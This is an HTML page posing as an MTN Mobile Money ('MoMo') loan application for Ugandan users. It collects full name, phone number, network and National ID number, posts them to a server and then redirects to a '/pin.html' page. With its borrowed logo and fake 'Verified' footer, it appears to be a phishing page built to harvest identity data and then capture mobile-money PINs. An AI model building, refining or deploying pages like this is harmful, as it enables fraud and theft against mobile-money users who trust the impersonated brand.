<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo Loan</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0b5c6b;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  text-align: center;
  font-size: 20px;
  font-weight: bold;
}

.header img {
  height: 30px;
  vertical-align: middle;
  margin-right: 6px;
}

.container {
  max-width: 400px;
  margin: 30px auto;
  background: white;
  padding: 20px;
  border-radius: 18px;
}

h2 {
  text-align: center;
}

input, select {
  width: 100%;
  padding: 14px;
  margin: 10px 0;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
}

button {
  width: 100%;
  padding: 15px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
}

.footer {
  text-align: center;
  color: white;
  font-size: 12px;
  margin: 20px 0;
}
</style>
</head>

<body>

<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/MTN_Mobile_Money_logo.svg">
  MoMo App
</div>

<div class="container">
  <h2>Loan Application</h2>

  <form id="loanForm">
    <input type="text" name="name" placeholder="Full Name" required>
    <input type="text" name="phone" placeholder="Phone Number (07XXXXXXXX)" required>

    <select name="network" required>
      <option value="">Select Network</option>
      <option value="MTN">MTN</option>
      <option value="Airtel">Airtel</option>
    </select>

    <input type="number" name="amount" placeholder="Loan Amount (UGX)" required>
    <input type="text" name="nationalId" placeholder="National ID Number" required>

    <button type="submit" id="submitBtn">Apply Now</button>
  </form>
</div>

<div class="footer">
  2026@MoMo Verified
</div>

<script>
document.getElementById("loanForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const btn = document.getElementById("submitBtn");
  btn.disabled = true;
  btn.innerText = "Processing...";

  const formData = new FormData(this);
  const data = Object.fromEntries(formData.entries());

  // SAVE PHONE
  localStorage.setItem("phone", data.phone);

  try {
    const res = await fetch("/apply", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    // MOVE TO PIN PAGE
    window.location.href = "/pin.html";

  } catch (err) {
    alert("Server error");
    btn.disabled = false;
    btn.innerText = "Apply Now";
  }
});
</script>

</body>
</html>
